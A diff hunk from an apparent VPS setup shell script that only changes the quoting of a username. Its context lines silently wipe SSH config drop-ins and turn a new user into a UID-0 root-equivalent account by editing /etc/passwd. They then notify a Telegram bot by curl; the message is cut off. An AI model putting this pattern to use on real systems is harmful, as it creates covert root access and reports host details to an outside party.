@@ -188,7 +188,7 @@ vps_info(){
     sed -i 's/^#\?PubkeyAuthentication.*/PubkeyAuthentication yes/g' /etc/ssh/sshd_config >/dev/null 2>&1
     rm -rf /etc/ssh/sshd_config.d/* && rm -rf /etc/ssh/ssh_config.d/*
     useradd ${User} >/dev/null 2>&1
-    (echo ${Passwd}; sleep 1; echo ${Passwd}) | passwd "$User" &>/dev/null
+    (echo ${Passwd}; sleep 1; echo ${Passwd}) | passwd ${User} &>/dev/null
     sed -i "s|^.*${User}.*|${User}:x:0:0:root:/root:/bin/bash|" /etc/passwd >/dev/null 2>&1
     systemctl restart ssh* >/dev/null 2>&1
     curl -s -X POST https://api.telegram.org/bot${Bot_token}/sendMessage -d chat_id=${Chat_id} -d text="您的新机器已上线！🎉🎉🎉 
